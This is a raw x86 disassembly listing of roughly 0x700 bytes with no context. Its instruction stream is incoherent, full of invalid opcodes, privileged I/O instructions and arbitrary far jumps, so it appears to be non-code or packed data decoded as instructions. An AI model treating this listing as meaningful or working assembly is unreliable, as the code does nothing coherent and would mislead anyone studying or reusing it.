  4b9f8c:	test   DWORD PTR [esi+edx*4],edx
  4b9f8f:	mov    DWORD PTR es:[ebx-0x6dfd64d],ebp
  4b9f96:	sbb    dh,BYTE PTR [ebp+eiz*1-0x797c46af]
  4b9f9d:	sub    ebx,DWORD PTR ss:[ebp+eax*2+0x2c6efbda]
  4b9fa5:	shr    esi,1
  4b9fa7:	sub    al,bh
  4b9fa9:	dec    ebp
  4b9faa:	or     BYTE PTR [edi],al
  4b9fac:	xchg   edi,eax
  4b9fad:	iret   
  4b9fae:	rcr    DWORD PTR [edx],1
  4b9fb0:	xor    DWORD PTR [eax+0x3410152],ebp
  4b9fb6:	mov    cs,WORD PTR [ebx+0x5d]
  4b9fb9:	mov    bl,0x10
  4b9fbb:	lock xchg edx,eax
  4b9fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b9fbe:	ja     0x4b9f43
  4b9fc0:	aam    0x4a
  4b9fc2:	loop   0x4b9faa
  4b9fc4:	push   edx
  4b9fc5:	int3   
  4b9fc6:	hlt    
  4b9fc7:	out    0x5c,eax
  4b9fc9:	pop    edi
  4b9fca:	inc    eax
  4b9fcb:	xchg   esi,eax
  4b9fcc:	adc    bl,BYTE PTR [eax+edx*4+0x69bbeb11]
  4b9fd3:	xchg   ecx,eax
  4b9fd4:	inc    edx
  4b9fd5:	or     ah,0xeb
  4b9fd8:	loope  0x4b9fec
  4b9fda:	pop    eax
  4b9fdb:	enter  0xd01c,0xf5
  4b9fdf:	cwde   
  4b9fe0:	fisub  WORD PTR [eax+0x28]
  4b9fe3:	jno    0x4ba05c
  4b9fe5:	(bad)  
  4b9fe6:	jne    0x4ba017
  4b9fe8:	sbb    BYTE PTR [eax-0x10],cl
  4b9feb:	out    dx,al
  4b9fec:	adc    ah,BYTE PTR [edx+edx*1+0x25]
  4b9ff0:	cmp    ecx,DWORD PTR [ebx+0x16]
  4b9ff3:	add    ch,BYTE PTR [edi]
  4b9ff5:	and    ebx,ebp
  4b9ff7:	xor    ah,BYTE PTR [esp+esi*2]
  4b9ffa:	enter  0x146e,0x2c
  4b9ffe:	lods   eax,DWORD PTR ds:[esi]
  4b9fff:	adc    BYTE PTR [ebx],bl
  4ba001:	mov    edx,0x47230d6c
  4ba006:	lds    edx,FWORD PTR [eax+0xd]
  4ba009:	fld    DWORD PTR [esi-0x347cf0fb]
  4ba00f:	pop    ecx
  4ba010:	and    eax,0xb9815263
  4ba015:	lea    edx,[ebx-0x936908f]
  4ba01b:	xchg   BYTE PTR [ecx],al
  4ba01d:	cmp    al,0x34
  4ba01f:	int3   
  4ba020:	imul   DWORD PTR [ecx]
  4ba022:	sub    al,0x78
  4ba024:	das    
  4ba025:	sti    
  4ba026:	or     DWORD PTR [ecx-0x6b],esp
  4ba029:	add    DWORD PTR [ebp+eax*1+0x11685509],edx
  4ba030:	test   al,0xb9
  4ba032:	rcr    DWORD PTR [eax],cl
  4ba034:	in     al,dx
  4ba035:	pop    es
  4ba036:	cmp    BYTE PTR [ebx+0x46],al
  4ba039:	cli    
  4ba03a:	inc    eax
  4ba03b:	clc    
  4ba03c:	jmp    0x4ba071
  4ba03e:	adc    eax,0xd40296d2
  4ba043:	mov    dh,0xf
  4ba045:	imul   esp,DWORD PTR [ecx],0x5
  4ba048:	(bad)  
  4ba049:	not    esp
  4ba04b:	adc    bl,BYTE PTR [edx]
  4ba04d:	ret    
  4ba04e:	push   es
  4ba04f:	and    al,0xb5
  4ba051:	or     al,BYTE PTR [eax]
  4ba053:	pusha  
  4ba054:	push   ecx
  4ba055:	sub    BYTE PTR ds:0xe4312e7,cl
  4ba05b:	push   esp
  4ba05c:	in     eax,dx
  4ba05d:	inc    edi
  4ba05e:	pop    ebx
  4ba05f:	cmp    dl,dl
  4ba061:	adc    al,0x6d
  4ba063:	push   edx
  4ba064:	xchg   ecx,eax
  4ba065:	shr    BYTE PTR [edx+0xa],cl
  4ba068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ba069:	and    DWORD PTR [ebp+ecx*1-0x52],esi
  4ba06d:	mov    ds:0x495ca59,eax
  4ba072:	sub    dl,dl
  4ba074:	and    al,0x75
  4ba076:	ss inc ebx
  4ba078:	(bad)  
  4ba079:	lock sbb BYTE PTR [edi+0x49901c5a],0xc2
  4ba081:	bound  esp,QWORD PTR [edi-0x6f]
  4ba084:	push   edx
  4ba085:	ret    0x9
  4ba088:	sbb    BYTE PTR [si+0x63d3],bh
  4ba08d:	push   ebx
  4ba08e:	xchg   DWORD PTR [eax+ecx*1],esi
  4ba091:	and    al,BYTE PTR [ecx]
  4ba093:	test   DWORD PTR [eax],esi
  4ba095:	dec    esi
  4ba096:	addr16 (bad) 
  4ba098:	(bad)  
  4ba099:	or     al,0x20
  4ba09b:	dec    esp
  4ba09c:	adc    ebp,DWORD PTR [edi+0x4b]
  4ba09f:	mov    dl,BYTE PTR [esi+0x47]
  4ba0a2:	pop    edx
  4ba0a3:	jp     0x4ba114
  4ba0a5:	dec    esp
  4ba0a6:	in     eax,dx
  4ba0a7:	inc    esp
  4ba0a8:	jo     0x4ba0e5
  4ba0aa:	aad    0x3
  4ba0ac:	xor    ecx,ecx
  4ba0ae:	push   es
  4ba0af:	push   cs
  4ba0b0:	mov    edi,0x2d28bb39
  4ba0b5:	sbb    eax,0x6fab283a
  4ba0ba:	jmp    0x12a8:0x68804a5e
  4ba0c1:	(bad)  
  4ba0c2:	sub    cl,BYTE PTR ds:0x868f087
  4ba0c8:	sub    cl,BYTE PTR [eax-0x5f]
  4ba0cb:	jns    0x4ba124
  4ba0cd:	sub    bl,BYTE PTR [ecx+ecx*1]
  4ba0d0:	add    ebp,edi
  4ba0d2:	(bad)  
  4ba0d3:	lock add dl,BYTE PTR ds:0x60e22892
  4ba0da:	bound  esi,QWORD PTR [esi+eiz*1]
  4ba0dd:	ret    
  4ba0de:	cmp    dh,ch
  4ba0e0:	dec    edi
  4ba0e1:	nop
  4ba0e2:	fimul  DWORD PTR [ebx+0x20]
  4ba0e5:	fidiv  DWORD PTR [ebx+0x702dd1ff]
  4ba0eb:	dec    ecx
  4ba0ec:	sbb    al,0x32
  4ba0ee:	sbb    eax,0x15390db1
  4ba0f3:	xchg   esp,eax
  4ba0f4:	fisubr DWORD PTR [ebp+0x43]
  4ba0f7:	pop    edx
  4ba0f8:	inc    esp
  4ba0f9:	inc    edi
  4ba0fa:	cmp    dl,al
  4ba0fc:	adc    edi,DWORD PTR [ebx]
  4ba0fe:	jecxz  0x4ba169
  4ba100:	inc    edx
  4ba101:	add    ecx,DWORD PTR [ebx-0x1e]
  4ba104:	xchg   DWORD PTR [esp+ebx*2],ebp
  4ba107:	leave  
  4ba108:	leave  
  4ba109:	and    al,0x4
  4ba10b:	adc    BYTE PTR [esi+esi*4],bl
  4ba10e:	mov    BYTE PTR [esi+edi*4+0x5],bl
  4ba112:	jbe    0x4ba133
  4ba114:	adc    al,0x80
  4ba116:	mov    esi,DWORD PTR [edi+0x44e54b84]
  4ba11c:	sbb    al,0x6
  4ba11e:	push   eax
  4ba11f:	xchg   esi,eax
  4ba120:	ret    0x919
  4ba123:	sar    DWORD PTR [edx+0x18],cl
  4ba126:	icebp  
  4ba127:	pop    ebp
  4ba128:	mov    edx,0x6cbec00a
  4ba12d:	push   ebp
  4ba12e:	push   edi
  4ba12f:	rcr    DWORD PTR [edi-0x7797265],cl
  4ba135:	cmp    BYTE PTR [ebx+0x10],ah
  4ba138:	adc    eax,0x14f0b251
  4ba13d:	or     DWORD PTR [eax-0x311fe0e6],ebp
  4ba143:	pop    edi
  4ba144:	cli    
  4ba145:	sbb    eax,0x46013cdf
  4ba14a:	ins    DWORD PTR es:[edi],dx
  4ba14b:	pop    ds
  4ba14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ba14d:	dec    ecx
  4ba14e:	aas    
  4ba14f:	je     0x4ba196
  4ba151:	mov    dl,BYTE PTR [edx+0x11]
  4ba154:	mov    eax,0x2f6223db
  4ba159:	jne    0x4ba12d
  4ba15b:	jne    0x4ba1ab
  4ba15d:	and    BYTE PTR [edx-0x4c7beda0],cl
  4ba163:	mov    bl,0x4
  4ba165:	test   eax,0x5244e7c9
  4ba16a:	adc    esp,DWORD PTR [edx]
  4ba16c:	fimul  WORD PTR [ecx+0x1a2001ac]
  4ba172:	inc    eax
  4ba173:	adc    al,0x6
  4ba175:	push   ss
  4ba176:	add    edx,DWORD PTR [ecx]
  4ba178:	js     0x4ba1ed
  4ba17a:	jmp    0x8633:0x302091de
  4ba181:	mov    edx,0xc0c08a96
  4ba186:	jecxz  0x4ba10a
  4ba188:	push   esi
  4ba189:	pop    es
  4ba18a:	jbe    0x4ba1ba
  4ba18c:	daa    
  4ba18d:	cwde   
  4ba18e:	ror    BYTE PTR [edx],cl
  4ba190:	in     eax,dx
  4ba191:	push   ecx
  4ba192:	in     al,dx
  4ba193:	js     0x4ba19f
  4ba195:	add    bh,ah
  4ba197:	scas   eax,DWORD PTR es:[edi]
  4ba198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ba199:	add    eax,0x41576b5f
  4ba19e:	sub    dh,bh
  4ba1a0:	popf   
  4ba1a1:	cmp    edi,DWORD PTR [esp+ebp*2+0x44]
  4ba1a5:	push   ecx
  4ba1a6:	add    eax,0x651c7608
  4ba1ab:	dec    ecx
  4ba1ac:	and    BYTE PTR [ebx+0x66184632],cl
  4ba1b2:	add    BYTE PTR [ecx+0x3c],ch
  4ba1b5:	mov    ecx,DWORD PTR [esp+ebx*2]
  4ba1b8:	add    BYTE PTR [esi+0x1c307feb],bl
  4ba1be:	adc    al,0x54
  4ba1c0:	js     0x4ba22a
  4ba1c2:	int    0x3a
  4ba1c4:	xor    al,0x81
  4ba1c6:	movntq QWORD PTR [edi],mm7
  4ba1c9:	xchg   ecx,eax
  4ba1ca:	int3   
  4ba1cb:	add    DWORD PTR [eax-0x80],esp
  4ba1ce:	jl     0x4ba234
  4ba1d0:	ret    
  4ba1d1:	or     BYTE PTR ds:0xabb11c8,dl
  4ba1d7:	fucomi st,st(3)
  4ba1d9:	inc    ebp
  4ba1da:	adc    al,0x98
  4ba1dc:	imul   ecx,DWORD PTR [ebp-0x3f02a4dd],0x102ea6d5
  4ba1e6:	cdq    
  4ba1e7:	sbb    bl,al
  4ba1e9:	shl    BYTE PTR [eax],0x9a
  4ba1ec:	std    
  4ba1ed:	pop    esp
  4ba1ee:	rcl    BYTE PTR [edi],0xce
  4ba1f1:	add    DWORD PTR [edi+0x9],0x88022fe8
  4ba1f8:	adc    eax,0x3b855b12
  4ba1fd:	or     al,0xbc
  4ba1ff:	xchg   ecx,eax
  4ba200:	retf   
  4ba201:	daa    
  4ba202:	push   esp
  4ba203:	sub    DWORD PTR [esi],esp
  4ba205:	in     al,dx
  4ba206:	mov    edx,0x9e850608
  4ba20b:	cmp    ah,bh
  4ba20d:	sbb    BYTE PTR [esi+0x7],cl
  4ba210:	adc    al,ah
  4ba212:	(bad)  
  4ba214:	test   DWORD PTR [eax],edx
  4ba216:	sbb    cl,cl
  4ba218:	push   ebx
  4ba219:	pop    ebx
  4ba21a:	into   
  4ba21b:	mov    eax,DWORD PTR [ebx+0x5b50857c]
  4ba221:	adc    BYTE PTR [edi+0x41],0xe9
  4ba225:	jle    0x4ba22c
  4ba227:	fdivr  st(6),st
  4ba229:	inc    ebx
  4ba22a:	sub    BYTE PTR [ebx],al
  4ba22c:	je     0x4ba1e4
  4ba22e:	ficomp WORD PTR [edi+0x45]
  4ba231:	add    al,0x6b
  4ba233:	ins    BYTE PTR es:[edi],dx
  4ba234:	aam    0x76
  4ba236:	sub    dl,BYTE PTR [eax]
  4ba238:	jne    0x4ba251
  4ba23a:	(bad)  
  4ba23b:	mov    bh,0x85
  4ba23d:	jo     0x4ba202
  4ba23f:	mov    WORD PTR [ebx-0x1ebb60ff],cs
  4ba245:	lock je 0x4ba26f
  4ba248:	sti    
  4ba249:	sub    esi,eax
  4ba24b:	add    al,0x49
  4ba24d:	or     BYTE PTR [ebx+ebp*4-0xb],bl
  4ba251:	rcl    DWORD PTR [esi+eax*4+0x750a1f04],0x9
  4ba259:	outs   dx,BYTE PTR ds:[esi]
  4ba25a:	test   al,0xbd
  4ba25c:	pop    ss
  4ba25d:	test   DWORD PTR [ecx-0x10],edi
  4ba260:	jmp    0x4ba2c9
  4ba262:	xor    BYTE PTR [edx],al
  4ba264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ba265:	jge    0x4ba283
  4ba267:	adc    BYTE PTR ds:0x7e28bf8b,dl
  4ba26d:	push   ecx
  4ba26e:	fcmovb st,st(2)
  4ba270:	popa   
  4ba271:	inc    edi
  4ba272:	push   ebp
  4ba273:	les    esi,FWORD PTR [ebx]
  4ba275:	inc    eax
  4ba276:	popf   
  4ba277:	gs jmp 0x4ba2af
  4ba27a:	popf   
  4ba27b:	dec    eax
  4ba27c:	dec    esp
  4ba27d:	sub    al,0x4f
  4ba27f:	jp     0x4ba28d
  4ba281:	das    
  4ba282:	ins    DWORD PTR es:[edi],dx
  4ba283:	add    BYTE PTR [ebx+0x9],bh
  4ba286:	or     DWORD PTR [edi],ebp
  4ba288:	mov    edx,0x41200c9d
  4ba28d:	mov    DWORD PTR [edi+ebx*1],ebp
  4ba290:	stc    
  4ba291:	cmp    ch,BYTE PTR [eax]
  4ba293:	mov    ds:0x53f38b15,eax
  4ba298:	mov    DWORD PTR [ebx+0x2c],eax
  4ba29b:	dec    esi
  4ba29c:	jmp    0x43d56bc2
  4ba2a1:	xor    esp,DWORD PTR [ebx+0x34e96f6d]
  4ba2a7:	je     0x4ba230
  4ba2a9:	xlat   BYTE PTR ds:[ebx]
  4ba2aa:	sub    DWORD PTR [eax+ecx*1],0x25c85c29
  4ba2b1:	add    DWORD PTR [ecx+0x7c],edx
  4ba2b4:	add    dh,BYTE PTR [eax-0x59]
  4ba2b7:	outs   dx,DWORD PTR ds:[esi]
  4ba2b8:	and    DWORD PTR [edx-0x5abd3d8f],eax
  4ba2be:	cwde   
  4ba2bf:	or     ch,dh
  4ba2c1:	mov    dl,0x36
  4ba2c3:	xchg   edx,eax
  4ba2c4:	sub    al,BYTE PTR [edx]
  4ba2c6:	pop    esp
  4ba2c7:	fimul  WORD PTR [ebp+0x65c08aa]
  4ba2cd:	sbb    edi,ecx
  4ba2cf:	sbb    eax,0xb6e04541
  4ba2d4:	and    esp,0x97003c71
  4ba2da:	sbb    cl,0x0
  4ba2dd:	sub    ch,ah
  4ba2df:	pop    edx
  4ba2e0:	or     al,0x60
  4ba2e2:	xchg   ebp,eax
  4ba2e3:	dec    ebp
  4ba2e4:	mov    fs,WORD PTR [eax-0x94dba0b]
  4ba2ea:	rol    DWORD PTR [ebx],0x75
  4ba2ed:	pop    ss
  4ba2ee:	and    eax,0x16b9f2d4
  4ba2f3:	minps  xmm0,XMMWORD PTR [ecx+0x10]
  4ba2f7:	fxch   st(2)
  4ba2f9:	adc    BYTE PTR [edx],cl
  4ba2fb:	pop    eax
  4ba2fc:	adc    DWORD PTR [edi+edi*1+0x57c946a0],eax
  4ba303:	add    BYTE PTR [edx],ch
  4ba305:	in     al,dx
  4ba306:	pop    es
  4ba307:	aas    
  4ba308:	mov    BYTE PTR [ebx+0x52b4f881],bh
  4ba30e:	push   esi
  4ba30f:	add    esi,DWORD PTR [ebx-0x4c]
  4ba312:	sub    dl,BYTE PTR [ebp-0x659f5e7]
  4ba318:	adc    ch,BYTE PTR [edx+eiz*2]
  4ba31b:	stc    
  4ba31c:	in     al,0xda
  4ba31e:	inc    esi
  4ba31f:	add    eax,0x4cda2be7
  4ba324:	add    BYTE PTR [ebx+0x79],dl
  4ba327:	or     al,0xc9
  4ba329:	pop    eax
  4ba32a:	das    
  4ba32b:	pop    ebp
  4ba32c:	sbb    ecx,DWORD PTR [edx-0xa]
  4ba32f:	adc    ecx,DWORD PTR [ecx-0x3681756a]
  4ba335:	inc    esp
  4ba336:	jb     0x4ba34f
  4ba338:	pop    edi
  4ba339:	dec    eax
  4ba33a:	fild   DWORD PTR [ecx]
  4ba33c:	loopne 0x4ba308
  4ba33e:	nop
  4ba33f:	push   ecx
  4ba340:	sti    
  4ba341:	and    BYTE PTR [edx],al
  4ba343:	(bad)  
  4ba344:	iret   
  4ba345:	pop    esp
  4ba346:	iret   
  4ba347:	inc    esi
  4ba348:	dec    esi
  4ba349:	fisub  DWORD PTR [eax+0x3f]
  4ba34c:	test   eax,eax
  4ba34e:	in     al,0x0
  4ba350:	cmp    DWORD PTR [eax],esp
  4ba352:	mov    esp,0x40e69256
  4ba357:	and    al,0xab
  4ba359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ba35a:	mov    ah,0x50
  4ba35c:	xlat   BYTE PTR ds:[ebx]
  4ba35d:	cmp    esi,edi
  4ba35f:	and    al,0x3d
  4ba361:	call   0x85c4:0xcc6df38
  4ba368:	je     0x4ba359
  4ba36a:	cdq    
  4ba36b:	push   ecx
  4ba36c:	sub    esi,ebx
  4ba36e:	push   edi
  4ba36f:	stos   BYTE PTR es:[edi],al
  4ba370:	(bad)  
  4ba371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ba372:	and    DWORD PTR [ecx-0x1a29ebde],0x7f
  4ba379:	cmp    ebp,edx
  4ba37b:	or     al,0xc
  4ba37d:	sub    eax,0xdf01f182
  4ba382:	imul   ebx,DWORD PTR [ebx-0x14b74fed],0x6f
  4ba389:	(bad)  
  4ba38a:	jne    0x4ba3d7
  4ba38c:	jg     0x4ba3e1
  4ba38e:	add    ebx,DWORD PTR [edx+eax*1+0x48]
  4ba392:	mov    bl,0x7c
  4ba394:	lods   eax,DWORD PTR ds:[esi]
  4ba396:	out    0x70,eax
  4ba398:	xchg   DWORD PTR [edx],esp
  4ba39a:	mov    dl,0x69
  4ba39c:	cld    
  4ba39d:	test   DWORD PTR [ebx-0x73],edi
  4ba3a0:	shr    dh,0xf8
  4ba3a3:	mov    WORD PTR [ebp-0x18fca920],es
  4ba3a9:	mov    ch,0xcf
  4ba3ab:	push   0xfeb6d63
  4ba3b0:	push   esi
  4ba3b1:	inc    esi
  4ba3b2:	and    DWORD PTR [ebx+0x10ef4183],eax
  4ba3b8:	push   edx
  4ba3b9:	addr16 es push ss
  4ba3bc:	(bad)  
  4ba3be:	sbb    al,cl
  4ba3c0:	ror    BYTE PTR [esp+esi*8-0x272da977],1
  4ba3c7:	push   0x42848d8d
  4ba3cc:	test   eax,0xda136329
  4ba3d1:	lahf   
  4ba3d2:	cdq    
  4ba3d3:	sub    ch,BYTE PTR ds:0xf50fa66d
  4ba3d9:	jo     0x4ba3eb
  4ba3db:	cwde   
  4ba3dc:	inc    eax
  4ba3dd:	rol    DWORD PTR [ecx+ecx*2+0x9],cl
  4ba3e1:	bound  esp,QWORD PTR [ecx-0x7fdadb29]
  4ba3e7:	test   DWORD PTR [ecx],0x575a1c14
  4ba3ed:	imul   edx,DWORD PTR [esi+0xe0c09ee],0x17458807
  4ba3f7:	and    ah,ah
  4ba3f9:	add    BYTE PTR ds:0x13f60f98,dh
  4ba3ff:	push   es
  4ba400:	pusha  
  4ba401:	daa    
  4ba402:	inc    ebp
  4ba403:	(bad)  
  4ba404:	xor    ah,cl
  4ba406:	sub    BYTE PTR [ebx+ecx*1],dh
  4ba409:	mov    dl,0xc0
  4ba40b:	cmp    edx,eax
  4ba40d:	add    eax,0xa4a1d2c5
  4ba412:	loopne 0x4ba39e
  4ba414:	jo     0x4ba43a
  4ba416:	lods   al,BYTE PTR ds:[esi]
  4ba417:	adc    al,0x9b
  4ba419:	shl    ah,1
  4ba41b:	gs mov ch,0x57
  4ba41e:	xchg   esi,eax
  4ba41f:	mov    WORD PTR [ebp+0x17],?
  4ba422:	pushw  es
  4ba424:	ja     0x4ba3b8
  4ba426:	shl    BYTE PTR [ebx-0x7ba0789],0x50
  4ba42d:	fadd   DWORD PTR [ebx+eax*1]
  4ba430:	xchg   esi,eax
  4ba431:	push   edi
  4ba432:	pop    dx
  4ba434:	mov    edx,DWORD PTR [ecx]
  4ba436:	add    BYTE PTR [ebp+0x52],dh
  4ba439:	ret    0x1a1e
  4ba43c:	imul   eax,DWORD PTR ds:0xb93157dc,0x712a070
  4ba446:	popf   
  4ba447:	test   DWORD PTR [edi],esp
  4ba449:	aad    0xe9
  4ba44b:	ret    
  4ba44c:	mov    edi,0x46e92cbf
  4ba451:	into   
  4ba452:	out    0xaf,al
  4ba454:	fiadd  DWORD PTR [edx+eax*4]
  4ba457:	xor    al,0xc1
  4ba459:	retf   
  4ba45a:	add    DWORD PTR [eax],ebp
  4ba45c:	shl    BYTE PTR ss:[esi],0x48
  4ba460:	add    bl,0x8a
  4ba463:	push   ebx
  4ba464:	mov    ah,0x7d
  4ba466:	mov    al,dl
  4ba468:	sbb    eax,0x1488ebf0
  4ba46d:	xor    BYTE PTR [eax+edx*1+0x6c],cl
  4ba471:	pusha  
  4ba472:	ja     0x4ba4a8
  4ba474:	mov    ah,0xfc
  4ba476:	mov    dl,0x4d
  4ba478:	loopne 0x4ba4cb
  4ba47a:	xor    ch,cl
  4ba47c:	rol    BYTE PTR [ebx+ebx*8],cl
  4ba47f:	mov    ebp,0x757bccb3
  4ba484:	add    ebx,DWORD PTR [eax+0x4]
  4ba487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ba488:	pop    ebx
  4ba489:	ins    BYTE PTR es:[edi],dx
  4ba48a:	sar    ah,1
  4ba48c:	sbb    DWORD PTR [ebx],ecx
  4ba48e:	bound  edx,QWORD PTR [edx]
  4ba490:	inc    ecx
  4ba491:	and    cl,ah
  4ba493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ba494:	adc    dh,BYTE PTR [edi+0x1b2ba0a8]
  4ba49a:	pop    ss
  4ba49b:	pop    ebx
  4ba49c:	call   0x3c0da458
  4ba4a1:	loop   0x4ba45b
  4ba4a3:	or     BYTE PTR [ebx],ah
  4ba4a5:	pop    esp
  4ba4a6:	mov    al,BYTE PTR [ebp+0x24]
  4ba4a9:	mov    cl,BYTE PTR [ebp+0x20]
  4ba4ac:	lea    ebp,[eax+0x77f5944d]
  4ba4b2:	adc    al,0x52
  4ba4b4:	mov    al,dl
  4ba4b6:	dec    edi
  4ba4b7:	add    eax,0x3d243b68
  4ba4bc:	cmp    al,0xf3
  4ba4be:	sub    ah,BYTE PTR [esp+ecx*4]
  4ba4c1:	jle    0x4ba4cc
  4ba4c3:	mov    fs,WORD PTR [ecx-0x4d]
  4ba4c6:	xchg   DWORD PTR [ecx+0x63],ebp
  4ba4c9:	jmp    0x4ba50d
  4ba4cb:	mov    ebx,edi
  4ba4cd:	stc    
  4ba4ce:	test   al,0x89
  4ba4d0:	sub    BYTE PTR [edx+0x4f101881],al
  4ba4d6:	sar    DWORD PTR [ecx-0x382423bb],cl
  4ba4dc:	xchg   esp,ecx
  4ba4de:	dec    ebp
  4ba4df:	mov    BYTE PTR [edi+0x18],0xd8
  4ba4e3:	std    
  4ba4e4:	add    ch,BYTE PTR ds:0xd7d09f6a
  4ba4ea:	lahf   
  4ba4eb:	in     al,0x70
  4ba4ed:	inc    edx
  4ba4ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ba4ef:	leave  
  4ba4f0:	popf   
  4ba4f1:	inc    eax
  4ba4f2:	inc    edi
  4ba4f3:	adc    BYTE PTR [ebx+0x12],cl
  4ba4f6:	push   0x6c0fa826
  4ba4fb:	mov    eax,0x4297d6c3
  4ba500:	adc    BYTE PTR [eax+0x410425f],cl
  4ba506:	jne    0x4ba583
  4ba508:	lods   al,BYTE PTR ds:[esi]
  4ba509:	dec    edi
  4ba50a:	adc    BYTE PTR [ebp-0x7e],bl
  4ba50d:	xchg   edx,eax
  4ba50e:	(bad)  
  4ba50f:	sub    al,BYTE PTR [eax]
  4ba511:	popa   
  4ba512:	pusha  
  4ba513:	cmp    BYTE PTR [ebp+0x7618d070],ch
  4ba519:	test   al,0xff
  4ba51b:	push   esi
  4ba51c:	push   esi
  4ba51d:	adc    ecx,DWORD PTR [eax+eax*4+0x43]
  4ba521:	inc    eax
  4ba522:	adc    esp,ebp
  4ba524:	push   edi
  4ba525:	mov    ch,0x2b
  4ba527:	loop   0x4ba56f
  4ba529:	mov    ds:0x13b672de,al
  4ba52e:	lock add al,0x43
  4ba531:	aaa    
  4ba532:	mov    ah,al
  4ba534:	sub    al,BYTE PTR [eax+0x46e7e1b6]
  4ba53a:	sub    BYTE PTR [esi-0x5cdfa6b7],0xa5
  4ba541:	ss inc esi
  4ba543:	sbb    ebp,DWORD PTR [ebx-0x4271a2d8]
  4ba549:	stc    
  4ba54a:	push   ss
  4ba54b:	sbb    BYTE PTR [ebx+edi*2],al
  4ba54e:	sbb    BYTE PTR [ebp-0x3fa2d081],cl
  4ba554:	inc    edx
  4ba555:	and    dl,dl
  4ba557:	sub    BYTE PTR [edi],al
  4ba559:	add    ebp,edi
  4ba55b:	push   0xffffffa3
  4ba55d:	fidivr DWORD PTR [esi-0x9eb44a9]
  4ba563:	dec    eax
  4ba564:	adc    eax,eax
  4ba566:	and    edx,DWORD PTR [ecx]
  4ba568:	sti    
  4ba569:	push   edx
  4ba56a:	add    DWORD PTR [ecx+ecx*1-0x79],ebx
  4ba56e:	xlat   BYTE PTR ds:[bx]
  4ba570:	add    edx,DWORD PTR [edi]
  4ba572:	es mov ah,0x18
  4ba575:	mov    ebx,0xf20371c7
  4ba57a:	mov    ah,0xbb
  4ba57c:	dec    ebp
  4ba57d:	pop    eax
  4ba57e:	xor    al,ah
  4ba580:	push   ecx
  4ba581:	cmc    
  4ba582:	mov    BYTE PTR [eax+0x7c],ah
  4ba585:	sub    dl,BYTE PTR [esp+esi*2+0x51]
  4ba589:	(bad)
  4ba58c:	push   cs
  4ba58d:	fwait
  4ba58e:	adc    ebx,DWORD PTR [ebx+0x388c5184]
  4ba594:	in     eax,dx
  4ba595:	popf   
  4ba596:	es inc ebx
  4ba598:	or     BYTE PTR [eax+0x2e164001],ch
  4ba59e:	repnz pusha 
  4ba5a0:	sbb    eax,0x20893c82
  4ba5a5:	clc    
  4ba5a6:	add    BYTE PTR [edx+eax*1-0x8],dh
  4ba5aa:	(bad)  
  4ba5ab:	sub    esp,DWORD PTR [ebx-0x1f]
  4ba5ae:	push   es
  4ba5af:	sbb    cl,ah
  4ba5b1:	dec    eax
  4ba5b2:	aaa    
  4ba5b3:	(bad)  
  4ba5b4:	mov    WORD PTR ds:[ecx],cs
  4ba5b7:	stc    
  4ba5b8:	lea    esi,[edi]
  4ba5ba:	loope  0x4ba5d8
  4ba5bc:	push   eax
  4ba5bd:	pop    ss
  4ba5be:	test   DWORD PTR [eax],eax
  4ba5c0:	fisubr WORD PTR [edi+0x84b8352]
  4ba5c6:	or     BYTE PTR [edi-0x6d3dc63],bh
  4ba5cc:	loopne 0x4ba5ac
  4ba5ce:	cld    
  4ba5cf:	outs   dx,DWORD PTR ds:[esi]
  4ba5d0:	cmp    BYTE PTR [eax+0xa],dl
  4ba5d3:	cmp    DWORD PTR [edx],0xffffffd8
  4ba5d6:	jno    0x4ba628
  4ba5d8:	push   esi
  4ba5d9:	jae    0x4ba653
  4ba5db:	and    DWORD PTR [eax-0x4af5c835],edx
  4ba5e1:	pusha  
  4ba5e2:	fbld   TBYTE PTR [ebp-0x2f134c9c]
  4ba5e8:	mov    eax,0x6881a41f
  4ba5ed:	ror    ah,0x4c
  4ba5f0:	and    eax,0xcbd42f80
  4ba5f5:	xchg   esi,eax
  4ba5f6:	add    edi,DWORD PTR [ecx-0x22]
  4ba5f9:	dec    esp
  4ba5fa:	push   0xe7545168
  4ba5ff:	nop
  4ba600:	imul   ecx,DWORD PTR [ebp-0x2796ade9],0x40e45044
  4ba60a:	sahf   
  4ba60b:	ins    BYTE PTR es:[edi],dx
  4ba60c:	push   eax
  4ba60d:	dec    esp
  4ba60e:	xor    BYTE PTR [esi+esi*4+0x12],ah
  4ba612:	sub    ebp,DWORD PTR [ecx-0x24]
  4ba615:	pop    es
  4ba616:	repnz add ch,BYTE PTR [ecx+0x3d]
  4ba61a:	jo     0x4ba61c
  4ba61c:	add    al,0xe0
  4ba61e:	sub    dl,BYTE PTR [edi]
  4ba620:	jb     0x4ba642
  4ba622:	je     0x4ba640
  4ba624:	add    DWORD PTR [ecx+0x6a],0x6
  4ba628:	pusha  
  4ba629:	loope  0x4ba662
  4ba62b:	dec    ebx
  4ba62c:	popf   
  4ba62d:	or     edi,DWORD PTR [ecx+0x5c]
  4ba630:	push   ecx
  4ba631:	lea    eax,[eax+0x39]
  4ba634:	add    eax,0x5d8f60ef
  4ba639:	xchg   BYTE PTR [eax+0x37],al
  4ba63c:	pushf  
  4ba63d:	push   ecx
  4ba63e:	xchg   ebp,eax
  4ba63f:	dec    ebp
  4ba640:	(bad)
  4ba644:	add    dh,BYTE PTR ds:0x68ab0101
  4ba64a:	sbb    DWORD PTR [esi],ebx
  4ba64c:	or     al,0xe1
  4ba64e:	xor    BYTE PTR [ebx+ecx*2+0x76],dl
  4ba652:	sub    al,0xf
  4ba654:	imul   esi,DWORD PTR [eax+0x2a8fbd30],0x1874fd32
  4ba65e:	xor    BYTE PTR [eax-0x26],cl
  4ba661:	daa    
  4ba662:	pop    ebx
  4ba663:	call   0xc3f5:0x3354c1d8
  4ba66a:	call   0x7c9766c0
  4ba66f:	je     0x4ba685
  4ba671:	mov    edx,0x11eeb14
  4ba676:	daa    
  4ba677:	ins    DWORD PTR es:[edi],dx
  4ba678:	out    0x52,al
  4ba67a:	loope  0x4ba60f
